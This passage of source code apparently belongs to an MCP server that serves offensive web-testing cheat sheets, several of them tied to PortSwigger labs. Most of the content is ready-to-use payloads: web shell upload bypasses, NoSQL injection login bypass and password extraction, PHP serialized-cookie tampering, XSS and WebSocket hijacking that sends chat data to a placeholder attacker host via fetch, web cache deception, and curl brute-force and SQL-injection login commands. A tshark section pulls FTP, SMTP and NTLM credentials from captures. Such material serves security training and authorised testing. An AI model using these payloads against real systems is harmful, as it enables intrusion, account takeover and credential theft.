\`\`\`

### Step 2: Upload shell with custom extension
\`\`\`bash
curl -X POST https://target.com/upload \\
  -F "file=@shell.l33t"
\`\`\`

The server executes \`.l33t\` files as PHP due to the \`.htaccess\` directive.

## Lab: Web shell upload via path traversal (PortSwigger)
- Upload directory has PHP execution disabled; escape via path traversal in Content-Disposition filename
- URL-encode the slash: \`..%2fshell.php\` to land shell one directory above avatars
- Access at \`/files/shell.php\` (above the non-executable avatars directory)
- Payload: \`Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"\`

## Lab: Web shell upload via obfuscated file extension (PortSwigger)
- Null byte injection in filename bypasses extension validation at the application layer
- Server validation sees \`.jpg\`, but filesystem stores as \`.php\` (null byte truncates)
- Payload: \`filename="shell.php%00.jpg"\`

## Lab: Remote code execution via polyglot web shell upload (PortSwigger)
- Server validates magic bytes (file signature), not just extension or Content-Type
- Create polyglot: valid JPEG with PHP payload embedded in COM (comment) segment
- Upload as \`.php\` — passes JPEG magic byte check, PHP interpreter executes embedded code
- Payload: Use Pillow/exiftool to inject \`<?php echo file_get_contents("/home/carlos/secret"); ?>\` into JPEG comment
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 15. NoSQL Injection Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "nosqli_cheatsheet",
    "operant://nosqli_cheatsheet",
    { description: "Operator injection auth bypass, category filter injection, character-by-character password extraction for NoSQL injection.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://nosqli_cheatsheet",
        mimeType: "text/markdown",
        text: `# NoSQL Injection Cheatsheet

## Operator Injection — Auth Bypass
Replace the password with a \`$ne\` (not equal) operator to bypass authentication:
\`\`\`json
{
  "username": "admin",
  "password": {"$ne": ""}
}
\`\`\`
This matches any document where the password is not empty — effectively logging in without knowing the password.

## Category Filter Injection
Inject \`{"$ne": null}\` to return all categories:
\`\`\`
GET /products?category[$ne]=null
\`\`\`
Or in a JSON body:
\`\`\`json
{"category": {"$ne": null}}
\`\`\`

## Character-by-Character Password Extraction
Extract the password one character at a time using boolean-based injection:
\`\`\`
user=administrator'&&this.password[0]=='a'||'a'=='b
user=administrator'&&this.password[0]=='b'||'a'=='b
...
user=administrator'&&this.password[0]=='t'||'a'=='b
\`\`\`

When the correct character is found, the response differs (e.g., successful login vs error).

Iterate through each position:
\`\`\`
this.password[0]=='t'
this.password[1]=='e'
this.password[2]=='s'
...
\`\`\`

## Lab: Extract unknown fields via NoSQL operator injection (PortSwigger)
- Use \`$where\` clause with \`Object.keys(this)[N]\` to enumerate field names in MongoDB documents
- Boolean-based character-by-character extraction with \`.match('^pattern')\`
- Trigger password reset to create new fields (e.g., \`newPwdTkn\`) then extract token value
- Payload: \`{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[4].match('^newPwd')"}\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 16. Deserialization Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "deserialization_cheatsheet",
    "operant://deserialization_cheatsheet",
    { description: "PHP serialized session cookie manipulation, type juggling via data type modification.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://deserialization_cheatsheet",
        mimeType: "text/markdown",
        text: `# Deserialization Cheatsheet

## PHP Serialized Cookie Manipulation
Modify the \`admin\` field from \`0\` to \`1\` in a serialized session object:

Original cookie (base64-decoded):
\`\`\`
O:4:"User":2:{s:8:"username";s:5:"james";s:5:"admin";b:0;}
\`\`\`

Modified:
\`\`\`
O:4:"User":2:{s:8:"username";s:5:"james";s:5:"admin";b:1;}
\`\`\`

Base64-encode and replace the session cookie.

## PHP Type Juggling via Data Type Modification
Change the \`access_token\` from a string to an integer \`0\`:

Original:
\`\`\`
s:12:"access_token";s:32:"abc123def456...";
\`\`\`

Modified:
\`\`\`
s:12:"access_token";i:0;
\`\`\`

PHP loose comparison: \`0 == "any_string"\` evaluates to **true**.

This bypasses token validation because the integer \`0\` loosely equals any non-numeric string.
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 17. GraphQL Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "graphql_cheatsheet",
    "operant://graphql_cheatsheet",
    { description: "GraphQL introspection to find hidden fields and sensitive data.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://graphql_cheatsheet",
        mimeType: "text/markdown",
        text: `# GraphQL Cheatsheet

## Introspection Query
Run a full introspection query to enumerate the entire schema:
\`\`\`graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
\`\`\`

## Finding Hidden Fields
Introspection reveals fields not exposed in the UI. Look for sensitive fields like:
- \`postPassword\` on Post type
- \`secretKey\`, \`token\`, \`apiKey\` on User or Config types
- \`internalId\`, \`adminNotes\` on any type

Example — discovering a hidden \`postPassword\` field:
\`\`\`graphql
{
  __type(name: "Post") {
    fields {
      name
    }
  }
}
\`\`\`

Then query it:
\`\`\`graphql
{
  post(id: 1) {
    title
    content
    postPassword
  }
}
\`\`\`

## Introspection Disabled?
Try alternative endpoints:
- \`/graphql\`
- \`/graphql/v1\`
- \`/api/graphql\`
- \`/graphiql\` (GraphiQL IDE)
- \`/altair\` (Altair client)

Try sending the introspection query via GET with a query parameter if POST is blocked.
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 18. WebSocket Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "websocket_cheatsheet",
    "operant://websocket_cheatsheet",
    { description: "WebSocket message manipulation bypassing client-side encoding.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://websocket_cheatsheet",
        mimeType: "text/markdown",
        text: `# WebSocket Cheatsheet

## Message Manipulation
Client-side applications often HTML-encode WebSocket messages before sending. Intercept at the transport layer (before encoding) to bypass client-side sanitization.

### Attack Flow
1. Open WebSocket connection to the target.
2. Intercept outgoing messages at the network level (before the client's encoding function runs).
3. Inject raw payloads:
\`\`\`
<img src=x onerror=alert(1)>
\`\`\`

### Example: Chat Application XSS
The client encodes \`<\` and \`>\` before sending. Bypass by sending the raw WebSocket frame:
\`\`\`javascript
const ws = new WebSocket('wss://target.com/chat');
ws.onopen = function() {
  ws.send(JSON.stringify({
    message: '<img src=x onerror=alert(document.cookie)>'
  }));
};
\`\`\`

### Key Points
- Client-side encoding is not a security boundary — the server must validate/sanitize.
- WebSocket connections often have weaker auth than REST APIs.
- Test the negotiate/handshake endpoint without auth tokens.
- Test invoking hub methods without prior authentication.

## Lab: Cross-site WebSocket hijacking (PortSwigger)
- WebSocket handshake at \`/chat\` lacks Origin header validation
- Sending "READY" triggers chat history replay (may contain credentials)
- Exploit: open WebSocket from attacker page, exfiltrate messages via fetch
- Payload: \`var ws=new WebSocket('wss://TARGET/chat');ws.onopen=function(){ws.send("READY")};ws.onmessage=function(e){fetch('https://EXPLOIT/log?data='+btoa(e.data))}\`

## Lab: Manipulating WebSocket handshake to exploit vulnerabilities (PortSwigger)
- Chat messages rendered via \`innerHTML\` (XSS sink) with server-side XSS filter + IP ban
- Bypass IP block with \`X-Forwarded-For\` header in WebSocket handshake
- Bypass XSS filter with case variation (\`oNeRrOr\`) + HTML entity encoding (\`&#40;\`/\`&#41;\` for parentheses)
- Payload: \`{"message":"<img src=1 oNeRrOr=alert&#40;1&#41;>"}\` with \`X-Forwarded-For: 1.1.1.1\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 19. API Testing Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "api_testing_cheatsheet",
    "operant://api_testing_cheatsheet",
    { description: "API documentation discovery paths and HTTP method discovery via OPTIONS.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://api_testing_cheatsheet",
        mimeType: "text/markdown",
        text: `# API Testing Cheatsheet

## API Documentation Discovery
Check these common paths for exposed API documentation:
\`\`\`
/api/
/api-docs
/api-docs/v1
/swagger
/swagger.json
/swagger/v1/swagger.json
/swagger-ui.html
/openapi.json
/graphql
/graphiql
/v1/api-docs
/v2/api-docs
/docs
/redoc
\`\`\`

## HTTP Method Discovery via OPTIONS
Send an OPTIONS request to discover hidden methods:
\`\`\`bash
curl -X OPTIONS https://target.com/api/resource -i
\`\`\`

Check the \`Allow\` header in the response:
\`\`\`
Allow: GET, POST, PATCH, DELETE, OPTIONS
\`\`\`

Hidden methods like \`PATCH\`, \`PUT\`, and \`DELETE\` may not be documented but are still accessible.

### Methodology
1. Discover endpoints from JS bundles, traffic interception, or documentation.
2. For each endpoint, send \`OPTIONS\` to enumerate allowed methods.
3. Test each allowed method — the correct method may differ from expectations (e.g., \`CancelSubscription\` only accepts \`DELETE\`).
4. Test with different Content-Types (\`application/json\`, \`application/x-www-form-urlencoded\`, \`multipart/form-data\`).
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 20. Recon Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "recon_cheatsheet",
    "operant://recon_cheatsheet",
    { description: "robots.txt, security.txt, 404 pages, directory listing, admin dirs, brute-forcing, default vhosts, TLS cert SANs, response headers, visual recon, vhost brute-forcing, DNS enumeration, git history, S3/CDN, JS source review.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://recon_cheatsheet",
        mimeType: "text/markdown",
        text: `# Recon Cheatsheet

## Passive Discovery

### robots.txt
\`\`\`
GET /robots.txt
\`\`\`
Reveals disallowed paths — often admin panels, staging areas, backup directories.

### security.txt
\`\`\`
GET /.well-known/security.txt
GET /security.txt
\`\`\`
May reveal security contact, PGP keys, and vulnerability disclosure policies.

### 404 Error Pages
Request a non-existent page and inspect the error response. May leak:
- Server version (Apache, Nginx, IIS)
- Framework name and version (Django, Rails, Spring)
- Debug information or stack traces

### Response Headers
\`\`\`bash
curl -v -o /dev/null https://target.com 2>&1 | grep -E "^[<>]"
\`\`\`
Look for: \`Server\`, \`X-Powered-By\`, \`X-AspNet-Version\`, custom headers with sensitive data.

## Active Enumeration

### Directory Listing
Check common directories for listing enabled:
\`\`\`
/images/
/uploads/
/backup/
/assets/
/static/
\`\`\`

### Admin Directories
\`\`\`
/admin
/admin/
/administrator
/wp-admin
/manager
/cpanel
/phpmyadmin
/_admin
/admin-console
\`\`\`

### Directory Brute-Forcing
Use wordlists to discover hidden paths:
\`\`\`bash
# Use recon_directory_bruteforce tool with target URL
\`\`\`

### Default Virtual Hosts
Connect to the raw IP without a Host header or with an empty Host to see the default vhost response.

### TLS Certificate SANs
Extract Subject Alternative Names from the TLS certificate:
\`\`\`bash
# Use recon_tls_sans tool — reveals hidden subdomains
\`\`\`

### Visual Recon
Screenshot all discovered subdomains/hosts and visually identify interesting applications, login pages, admin panels.

## DNS Enumeration
- **Record types:** A, AAAA, MX, TXT, NS, SOA, CNAME
- **Zone transfer (AXFR):** Attempt on all nameservers
- **BIND version:** Query \`version.bind TXT CH\`
- **TXT records:** Often contain SPF, DKIM, domain verification tokens, internal notes

## Virtual Host Brute-Forcing
Send requests with different \`Host\` headers to discover virtual hosts:
\`\`\`bash
# Use recon_vhost tool
\`\`\`

## Git History Investigation
If a git repo is accessible:
- **Author names and emails** — reveal team members
- **Branch names** — reveal features, staging environments
- **Deleted files** — may contain secrets removed in later commits
- **Commit messages** — may reference internal systems, ticket IDs

## S3/CDN Assets
- Test S3 bucket access: \`https://s3.amazonaws.com/BUCKET_NAME\`
- Check for public listing, read, write permissions
- Look for \`assets.\`, \`cdn.\`, \`static.\` subdomains

## JS Source Review
- Search JavaScript bundles for hardcoded API keys, endpoints, credentials
- Look for quoted path segments, template literals with base URLs
- Check \`_next/static/chunks/\` (Next.js), \`main.*.js\` (Angular/React)
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 21. postMessage XSS Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "postmessage_xss_cheatsheet",
    "operant://postmessage_xss_cheatsheet",
    { description: "DOM XSS via postMessage: innerHTML sink, location.href sink, detection indicators.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://postmessage_xss_cheatsheet",
        mimeType: "text/markdown",
        text: `# postMessage XSS Cheatsheet

## innerHTML Sink
The target page has an event listener that writes \`e.data\` to innerHTML without origin validation:
\`\`\`html
<iframe src="https://target.com/vulnerable-page" onload="
  this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')
"></iframe>
\`\`\`

## location.href Sink
The target page sets \`location.href\` from \`e.data\` without validation:
\`\`\`html
<iframe src="https://target.com/vulnerable-page" onload="
  this.contentWindow.postMessage('javascript:print()', '*')
"></iframe>
\`\`\`

## Detection Indicators
Search the target's JavaScript for these patterns:

### Event Listener Registration
\`\`\`javascript
window.addEventListener('message', function(e) { ... })
\`\`\`

### Dangerous Sinks
Trace \`e.data\` to see if it flows into:
- \`element.innerHTML = e.data\`
- \`document.write(e.data)\`
- \`location.href = e.data\`
- \`eval(e.data)\`
- \`$(element).html(e.data)\`

### Missing Origin Validation
Check if the handler validates \`e.origin\`:
\`\`\`javascript
// VULNERABLE — no origin check:
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
});

// SAFE — validates origin:
window.addEventListener('message', function(e) {
  if (e.origin !== 'https://trusted.com') return;
  document.getElementById('output').innerHTML = e.data;
});
\`\`\`

If there is no \`e.origin\` check (or a weak one), any page can send a malicious postMessage to the vulnerable page.

## Lab: DOM XSS via web messages and JSON.parse (PortSwigger)
- Message handler parses \`e.data\` as JSON, checks \`d.type === "load-channel"\`, sets iframe \`src\` to \`d.url\`
- No origin validation on the message event listener
- \`javascript:\` protocol in iframe \`src\` as XSS sink
- Payload: \`<iframe src="https://TARGET/" onload='this.contentWindow.postMessage("{\\\"type\\\":\\\"load-channel\\\",\\\"url\\\":\\\"javascript:print()\\\"}","*")'></iframe>\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 22. Web Cache Deception Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "web_cache_deception_cheatsheet",
    "operant://web_cache_deception_cheatsheet",
    { description: "Path mapping for caching authenticated pages via web cache deception.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://web_cache_deception_cheatsheet",
        mimeType: "text/markdown",
        text: `# Web Cache Deception Cheatsheet

## Path Mapping Attack
Trick the cache into storing an authenticated page by appending a static file extension:
\`\`\`
/my-account/exploit.js
\`\`\`

### How It Works
1. The **origin server** uses path mapping: \`/my-account/exploit.js\` → \`/my-account\` (ignores the trailing path segment).
2. The **cache** sees the \`.js\` extension and caches the response as a static asset.
3. The authenticated user visits \`/my-account/exploit.js\` (via a link the attacker sends).
4. The cache stores the full authenticated response (with the user's personal data).
5. The attacker requests the same URL and gets the cached authenticated page.

### Common Extensions to Try
\`\`\`
/my-account/test.js
/my-account/test.css
/my-account/test.png
/my-account/test.svg
/my-account/test.ico
\`\`\`

### Verification
1. As the victim, visit \`/my-account/exploit.js\` while authenticated.
2. As the attacker (unauthenticated), request the same URL.
3. If the response contains the victim's authenticated data, the cache deception worked.

### Prerequisites
- The application must use path mapping (trailing path segments are ignored).
- A caching layer (CDN, reverse proxy) must cache based on file extension.
- The authenticated page must not have \`Cache-Control: no-store\` or \`private\`.
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 23. curl Patterns Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "curl_patterns_cheatsheet",
    "operant://curl_patterns_cheatsheet",
    { description: "Battle-tested curl patterns for security testing: CSRF extraction, brute-forcing, cookie manipulation, file upload, JSON APIs, and more.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://curl_patterns_cheatsheet",
        mimeType: "text/markdown",
        text: `# curl Patterns Cheatsheet

## Extract CSRF Token and Login
\`\`\`bash
CSRF=$(curl -s https://target/login | grep -oP 'csrf=\\K[^"]+')
curl -X POST https://target/login -d "csrf=$CSRF&username=administrator'--&password=anything"
\`\`\`

## View Response Headers Only
\`\`\`bash
curl -v -o /dev/null https://target 2>&1 | grep -E "^[<>]"
\`\`\`

## Brute-Force Login (Sequential)
\`\`\`bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\\n" http://target/login -d "user=admin&pass=wrong$i"
done
\`\`\`

## Cookie Manipulation
\`\`\`bash
curl -b "logged_in=true; admin=1" http://target/dashboard
\`\`\`

## JSON API Login
\`\`\`bash
curl -X POST -H "Content-Type: application/json" \\
  -d '{"user":"admin","pass":"admin"}' \\
  http://target/api/login
\`\`\`

## Follow Redirects
\`\`\`bash
curl -sL http://target
\`\`\`

## File Upload
\`\`\`bash
curl -X POST -F "file=@/path/to/shell.php" http://target/upload
\`\`\`

## Basic Auth
\`\`\`bash
curl -u admin:password http://target
\`\`\`

## Ignore TLS Errors (Self-Signed Certs)
\`\`\`bash
curl -k https://self-signed.target.com
\`\`\`

## Cookie Jar (Save + Reuse Cookies)
\`\`\`bash
curl -c cookies.txt http://target/login -d "user=admin&pass=admin" && \\
curl -b cookies.txt http://target/dashboard
\`\`\`

## JSON Response Parsing with jq
\`\`\`bash
curl -s http://target/api | jq '.data'
\`\`\`

## Raw IP Request
\`\`\`bash
curl -s http://51.158.147.132/
\`\`\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 24. tshark Commands Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "tshark_commands_cheatsheet",
    "operant://tshark_commands_cheatsheet",
    { description: "tshark/tcpdump one-liners for PCAP analysis: protocol hierarchy, endpoints, HTTP requests, DNS queries, credential extraction, TLS analysis, LLMNR/NTLM, port scans.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://tshark_commands_cheatsheet",
        mimeType: "text/markdown",
        text: `# tshark Commands Cheatsheet

## Protocol Hierarchy Overview
\`\`\`bash
tshark -r capture.pcap -q -z io,phs
\`\`\`

## Endpoint Statistics
\`\`\`bash
tshark -r capture.pcap -q -z endpoints,ip
\`\`\`

## HTTP Requests (Method, Host, URI)
\`\`\`bash
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.request.method -e http.host -e http.request.uri
\`\`\`

## DNS Queries (Unique)
\`\`\`bash
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u
\`\`\`

## Export HTTP Objects
\`\`\`bash
tshark -r capture.pcap --export-objects http,/tmp/http_objects/
\`\`\`

## Follow TCP Stream
\`\`\`bash
tshark -r capture.pcap -z "follow,tcp,ascii,5"
\`\`\`

## Top Talkers (Source IP by Packet Count)
\`\`\`bash
tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -20
\`\`\`

## FTP Credentials
\`\`\`bash
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.command -e ftp.request.arg
\`\`\`

## FTP Passwords Only
\`\`\`bash
tshark -r capture.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg
\`\`\`

## SMTP Credentials (Base64 Decoded)
\`\`\`bash
tshark -r capture.pcap -Y "smtp.auth.password" -T fields -e smtp.auth.password | base64 -d
\`\`\`

## TLS SNI (Server Name Indication)
\`\`\`bash
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name | sort -u
\`\`\`

## LLMNR Queries (Poisoning Detection)
\`\`\`bash
tshark -r capture.pcap -Y "udp.port == 5355" -T fields -e ip.src -e llmnr.query_name
\`\`\`

## SYN Scan Detection (Port Scanning)
\`\`\`bash
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn
\`\`\`

## IPv6 DNS Traffic
\`\`\`bash
tshark -r capture.pcap -Y "dns && ipv6" -T fields -e ipv6.dst -e ipv6.src | sort -u
\`\`\`

## TLS Server Key Exchange (DH Parameters)
\`\`\`bash
tshark -r capture.pcap -Y "tls.handshake.type == 12" -T fields -e tls.handshake.server_point
\`\`\`

## NTLM Authentication Details
\`\`\`bash
tshark -r capture.pcap -Y "ntlmssp.auth" -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.auth.hostname
\`\`\`
`
      }]
    })
  );
}
